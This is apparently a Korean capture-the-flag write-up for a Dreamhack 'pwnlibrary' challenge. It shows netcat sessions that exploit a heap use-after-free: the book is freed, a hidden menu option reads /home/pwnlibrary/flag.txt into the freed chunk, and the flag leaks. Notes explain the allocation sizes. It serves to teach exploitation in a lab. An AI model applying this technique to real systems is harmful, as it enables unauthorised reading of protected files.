@@ -1,0 +1,100 @@
+$ nc host1.dreamhack.games (port번호) 
+
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 
+(아 그래서 UAF였던 거구나 borrow한 다음에 다시 return해서 메모리를 free 시키면 
+그 메모리를 다시 불러올 때에 저장되어있던 걸 읽을 수 있는 취약점이었던 거구나) 
+
+
+[*] Welcome to library!
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 1
+[*] Welcome to borrow book menu!
+1. theori theory
+2. dreamhack theory
+3. einstein theory
+[+] what book do you want to borrow? : 1
+book create complete!
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 3
+[*] Welcome to return book menu!
+[*] lastest book returned!
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 275
+[*] Welcome to steal book menu!
+[!] caution. it is illegal!
+[+] whatever, where is the book? : /home/pwnlibrary/flag.txt
+[*] how many pages?(MAX 400) : 256
+
+[*] (Siren rangs) (Siren rangs)
+[*] Oops.. cops take your book..
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 2
+[*] Welcome to read book menu!
+0 : -----returned-----
+[+] what book do you want to read? : 0
+[*] book contents below [*]
+DH{--------flag-----------}
+
+
+실험결과
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 1
+[*] Welcome to borrow book menu!
+1. theori theory
+2. dreamhack theory
+3. einstein theory
+[+] what book do you want to borrow? : 1
+book create complete!
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 3
+[*] Welcome to return book menu!
+[*] lastest book returned!
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 275
+[*] Welcome to steal book menu!
+[!] caution. it is illegal!
+[+] whatever, where is the book? : /home/pwnlibrary/flag.txt
+[*] how many pages?(MAX 400) : 400
+
+[*] (Siren rangs) (Siren rangs)
+[*] Oops.. cops take your book..
+1. borrow book
+2. read book
+3. return book
+4. exit library
+[+] Select menu : 2
+[*] Welcome to read book menu!
+0 : -----returned-----
+1 : -----returned-----
+2 : -----returned-----
+[+] what book do you want to read? : 0
+[*] book contents below [*]
+
+steal_book에서 어떤 경로의 파일을 열 것인지 결정할 수 있습니다.
+borrow_book에서는 항목 별로 힙에 할당되는 메모리 크기가 0x100, 0x200, 0x300으로 정해져 있습니다.
+return_book에서는 borrow_book에서 할당받은 메모리를 free시킬 수 있습니다.
